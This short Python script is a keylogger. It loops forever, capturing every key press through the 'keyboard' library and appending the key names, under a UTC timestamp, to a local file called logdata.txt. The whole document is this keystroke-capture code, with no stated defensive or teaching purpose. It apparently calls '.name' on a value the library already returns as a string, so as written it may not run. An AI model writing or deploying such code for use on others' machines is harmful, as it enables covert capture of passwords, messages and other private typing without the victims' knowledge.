import keyboard as k
import pytz
from datetime import datetime
datet=datetime.now(pytz.utc)
datetstr="\nLog "+str(datet)+":"
with open("logdata.txt", "a") as f:
    f.write(datetstr)
while True:
    data=k.read_key().name+","
    with open("logdata.txt", "a") as f:
        f.write(data)
